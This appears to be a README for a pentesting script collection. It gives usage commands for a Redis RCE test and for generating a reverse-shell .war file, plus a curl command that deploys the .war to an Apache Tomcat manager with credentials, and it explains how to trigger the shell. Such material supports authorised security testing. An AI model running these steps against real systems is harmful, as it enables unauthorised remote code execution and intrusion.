## Collection of scripts for pentesting

### Testing Redis for RCE
```
python3 redis.py -i <IP> -p <PORT>
```

### Generating .war files for creating reverse shell on Apache Tomcat
```
python3 war/war.py -i <IP Address of reverse shell> -p <Port Number of reverse shell>
```
The exploit.war file will be created at /war/war directory, and can then be uploaded to the Apache Tomcat server via the following curl command

```
curl --upload-file /war/war/exploit.war -u '<username>:<password>' "http://<Apache Tomcat site>:8080/manager/text/deploy?path=/exploit"
```
Visiting http://<Apache Tomcat site>:8080/exploit will then trigger the reverse shell.
